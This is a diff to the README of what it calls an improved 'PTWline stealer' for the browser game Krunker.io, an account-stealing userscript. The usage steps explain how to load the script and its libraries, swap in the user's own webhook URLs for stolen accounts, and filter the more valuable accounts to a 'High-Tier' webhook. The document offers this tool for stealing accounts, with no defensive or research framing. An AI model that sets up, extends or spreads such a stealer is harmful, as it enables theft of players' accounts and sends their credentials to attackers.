@@ -5,7 +5,7 @@ An improved version of PTWline stealer for Krunker.io.
 # Usage
 
 - `@require` The script in your userscript header.
-- You might also need to require `jsonpack` and `msgpack-lite`.
+- You also need to require `jsonpack` and `msgpack-lite`, see example below.
 - Replace the `LO_WEBHOOK_URL` and `HI_WEBHOOK_URL` with your own webhook URLs.
 - You can also change the `HI_FILTER` to set which accounts will go to the High-Tier Webhook. ONLY ACCOUNTS MATCHING ALL THE FILTERS WILL BE SENT TO THE HIGH-TIER WEBHOOK.
 
